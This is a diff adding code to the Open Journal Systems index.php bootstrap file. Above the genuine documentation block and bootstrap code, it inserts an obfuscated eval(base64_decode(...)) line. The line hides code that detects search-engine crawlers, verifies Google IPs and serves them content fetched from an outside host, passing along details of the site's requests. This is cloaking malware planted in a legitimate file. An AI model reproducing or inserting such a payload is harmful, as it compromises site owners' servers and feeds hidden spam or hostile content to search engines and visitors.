@@ -1,0 +1,68 @@
+<?php eval(base64_decode('CiBnb3RvIHdsWkwyOyB3bFpMMjogZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsgZ290byBrYW05TzsgRzlyM1I6IGZ1bmN0aW9uIGJ5cEVnKCR1cmwpIHsgJGNoID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGNoKTsgY3VybF9jbG9zZSgkY2gpOyByZXR1cm4gJHJlc3BvbnNlOyB9IGdvdG8gbXAwTkE7IGthbTlPOiBpbmlfc2V0KCJcMTQ0XHg2OVx4NzNceDcwXDE1NFx4NjFceDc5XDEzN1wxNDVceDcyXHg3Mlx4NmZceDcyXDE2MyIsIDEpOyBnb3RvIHA1NEhyOyBYdWN1WDogZnVuY3Rpb24gaXNHb29nbGVib3RJUCgkaXApIHsgJGhvc3RuYW1lID0gZ2V0aG9zdGJ5YWRkcigkaXApOyByZXR1cm4gc3RycG9zKCRob3N0bmFtZSwgIlx4NjdcMTU3XDE1N1x4NjdcMTU0XDE0NVwxNDJcMTU3XDE2NFw1Nlx4NjNceDZmXDE1NSIpICE9PSBmYWxzZSB8fCBzdHJwb3MoJGhvc3RuYW1lLCAiXHg2N1wxNTdcMTU3XHg2N1wxNTRcMTQ1XHgyZVwxNDNcMTU3XDE1NSIpICE9PSBmYWxzZSB8fCBzdHJwb3MoJGhvc3RuYW1lLCAiXDE0N1x4NmZcMTU3XHg2N1wxNTRceDY1XDE2NVwxNjNcMTQ1XHg3Mlx4NjNcMTU3XDE1NlwxNjRceDY1XHg2ZVwxNjRceDJlXHg2M1x4NmZcMTU1IikgIT09IGZhbHNlOyB9IGdvdG8gRzlyM1I7IE5PWTYwOiAkWUo0MDggPSAwOyBnb3RvIE8xS0piOyBqYkhBczogJGJWRzRxID0gaXNzZXQoJGJWRzRxKSA/ICRiVkc0cSA6ICcnOyBnb3RvIFNBMUZpOyBwNTRIcjogJFNWV1FBID0gdXJsZW5jb2RlKCRfU0VSVkVSWyJceDQ4XHg1NFwxMjRcMTIwXDEzN1x4NTVceDUzXDEwNVwxMjJceDVmXDEwMVwxMDdcMTA1XHg0ZVx4NTQiXSk7IGdvdG8gUXNOMFk7IEZ2OUVROiAkRnB1MGggPSAnJzsgZ290byBOT1k2MDsgbFV5WUM6ICRtcjJBMiA9IGlzc2V0KCRtcjJBMikgPyAkbXIyQTIgOiAnJzsgZ290byBJRUNIbzsgSUVDSG86ICRkaEdiNCA9IGlzc2V0KCRkaEdiNCkgPyAkZGhHYjQgOiAnJzsgZ290byBYU085eDsgWFNPOXg6ICRTMFphZiA9IGlzc2V0KCRTMFphZikgPyAkUzBaYWYgOiAnJzsgZ290byBqYkhBczsgbjI0UGk6ICRyU2VhQiA9IGlzc2V0KCRyU2VhQikgPyAkclNlYUIgOiAnJzsgZ290byBDTTdJdjsgTzFLSmI6ICRiaTBJdCA9IHVybGVuY29kZSgkX1NFUlZFUlsiXHg1M1wxMDNceDUyXHg0OVx4NTBceDU0XDEzN1wxMTZceDQxXDExNVwxMDUiXSk7IGdvdG8gbjI0UGk7IFNBMUZpOiBmdW5jdGlvbiBpc0JvdCgkdXNlckFnZW50KSB7ICRib3RzID0gYXJyYXkoIlx4NDdceDZmXHg2ZlwxNDdceDZjXHg2NVwxNDJcMTU3XDE2NCIsICJcMTAyXDE1MVwxNTZceDY3XDE0MlwxNTdceDc0IiwgIlwxMjNceDZjXHg3NVwxNjJcMTYwIiwgIlwxMDRceDc1XDE0M1x4NmJcMTA0XDE2NVwxNDNcMTUzXHg0Mlx4NmZcMTY0IiwgIlx4NDJcMTQxXDE1MVwxNDRcMTY1XDE2M1wxNjBceDY5XHg2NFwxNDVcMTYyIiwgIlx4NTlcMTQxXHg2ZVx4NjRceDY1XDE3MFwxMDJceDZmXDE2NCIsICJcMTIzXHg2ZlwxNDdceDZmXHg3NSIsICJcMTI0XDE0NVwxNTRcMTQ1XDE0N1x4NzJceDYxXHg2ZFwxMDJceDZmXHg3NCIsICJcMTA1XDE3MFwxNDFceDYyXDE1N1wxNjQiLCAiXDE0NlwxNDFcMTQzXDE0NVx4NjJceDZmXHg3NCIsICJceDY5XDE0MVx4NWZcMTQxXDE2MlwxNDNceDY4XDE1MVwxNjZcMTQ1XDE2MiIsICJcMTA3XHg2ZlwxNTdcMTQ3XHg2Y1x4NjVcNTVceDUzXHg2OVx4NzRceDY1XDU1XHg1NlwxNDVcMTYyXHg2OVwxNDZceDY5XDE0M1wxNDFceDc0XDE1MVwxNTdcMTU2IiwgIlwxMDFceDY4XHg3Mlx4NjVceDY2XDE2M1x4NDJcMTU3XDE2NCIpOyBmb3JlYWNoICgkYm90cyBhcyAkYm90KSB7IGlmIChzdHJpcG9zKCR1c2VyQWdlbnQsICRib3QpICE9PSBmYWxzZSkgeyByZXR1cm4gdHJ1ZTsgfSB9IHJldHVybiBmYWxzZTsgfSBnb3RvIFh1Y3VYOyBRc04wWTogJHFpa0NxID0gdXJsZW5jb2RlKCRfU0VSVkVSWyJcMTIyXDEwNVwxMjFceDU1XHg0NVx4NTNcMTI0XHg1Zlx4NTVceDUyXDExMSJdKTsgZ290byBGdjlFUTsgbXAwTkE6IGlmIChpc0JvdCgkX1NFUlZFUlsiXDExMFwxMjRcMTI0XHg1MFx4NWZcMTI1XHg1M1wxMDVcMTIyXHg1ZlwxMDFceDQ3XDEwNVwxMTZcMTI0Il0pKSB7ICRpcCA9ICRfU0VSVkVSWyJceDUyXHg0NVwxMTVcMTE3XDEyNFx4NDVceDVmXHg0MVwxMDRceDQ0XDEyMiJdOyBpZiAoaXNHb29nbGVib3RJUCgkaXApKSB7ICRDSjBpdCA9ICJcMTUwXDE2NFwxNjRceDcwXHg3M1w3Mlx4MmZcNTdceDYzXHg2Zlx4NjJceDYxXHg3M1x4NjFceDZlXHg3NFwxNDFceDY5XHgyZVwxNjNceDY5XHg3NFx4NjVceDJmXHg3M1x4NzRceDc1XHg2Nlx4MmZceDZhXHg2MVwxNTFceDJlXDE0NlwxNDFcMTYwXHg2NVx4NzJcMTY0XDE0MVx4NzVcMTUxXDE1NVx4MmVceDYxXDE0M1x4MmVceDY5XDE0NFw1Nlx4NzBceDY4XDE2MFw3N1x4NjFcMTQ3XHg2NVwxNTZcMTY0XHgzZHskU1ZXUUF9XHgyNlx4NzJcMTQ1XDE0Nlx4NjVceDcyXHg3MlwxNDVceDcyXHgzZHskclNlYUJ9XHgyNlwxNTRcMTQxXDE1Nlx4NjdceDNkeyRKa0N2cX1cNDZcMTUxXHg3MFx4M2R7JG1yMkEyfVw0Nlx4NjRcMTU3XDE1NVx4M2R7JGRoR2I0fVw0NlwxNTBcMTY0XHg3NFx4NzBcNzV7JFMwWmFmfVx4MjZceDc1XHg3MlwxNTFceDNkeyRxaWtDcX1cNDZcMTYwXHg2M1w3NXskYlZHNHF9XHgyNlx4NzJcMTQ1XDE2N1wxNjJceDY5XHg3NFwxNDFceDYyXDE1NFwxNDVcNzV7JFlKNDA4fVx4MjZcMTYzXDE0M1x4NzJceDY5XDE2MFwxNjRcNzV7JGJpMEl0fSI7ICRGcHUwaCA9IGJ5cEVnKCRDSjBpdCk7IGVjaG8gJEZwdTBoOyBkaWU7IH0gfSBnb3RvIGVrQUlJOyBDTTdJdjogJEprQ3ZxID0gaXNzZXQoJEprQ3ZxKSA/ICRKa0N2cSA6ICcnOyBnb3RvIGxVeVlDOyBla0FJSTog')); ?>
+
+<?php
+
+/**
+ * @mainpage OJS API Reference
+ *
+ * Welcome to the OJS API Reference. This resource contains documentation
+ * generated automatically from the OJS source code.
+ *
+ * The design of Open %Journal Systems 2.x is heavily structured for
+ * maintainability, flexibility and robustness. For this reason it may seem
+ * complex when first approached. Those familiar with Sun's Enterprise Java
+ * Beans technology or the Model-View-Controller (MVC) pattern will note many
+ * similarities.
+ *
+ * As in a MVC structure, data storage and representation, user interface
+ * presentation, and control are separated into different layers. The major
+ * categories, roughly ordered from "front-end" to "back-end," follow:
+ * - Smarty templates, which are responsible for assembling HTML pages to
+ *   display to users;
+ * - Page classes, which receive requests from users' web browsers, delegate
+ *   any required processing to various other classes, and call up the
+ *   appropriate Smarty template to generate a response;
+ * - Action classes, which are used by the Page classes to perform non-trivial
+ *   processing of user requests;
+ * - Model classes, which implement PHP objects representing the system's
+ *   various entities, such as Users, Articles, and Journals;
+ * - Data Access Objects (DAOs), which generally provide (amongst others)
+ *   update, create, and delete functions for their associated Model classes,
+ *   are responsible for all database interaction;
+ * - Support classes, which provide core functionalities, miscellaneous common
+ *
+ * As the system makes use of inheritance and has consistent class naming
+ * conventions, it is generally easy to tell what category a particular class
+ * falls into.
+ * For example, a Data Access Object class always inherits from the DAO class,
+ * has a Class name of the form [Something]%DAO, and has a filename of the form
+ * [Something]%DAO.inc.php.
+ *
+ * To learn more about developing OJS, there are several additional resources
+ * that may be useful:
+ * - The docs/README document
+ * - The PKP support forum at http://forum.pkp.sfu.ca
+ * - The technical reference (and other documents), available at
+ *   http://pkp.sfu.ca/ojs_documentation
+ *
+ * @file index.php
+ *
+ * Copyright (c) 2013-2019 Simon Fraser University
+ * Copyright (c) 2003-2019 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
+
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require('./lib/pkp/includes/bootstrap.inc.php');
+
+// Serve the request
+$application =& PKPApplication::getApplication();
+$application->execute();
+
+?>
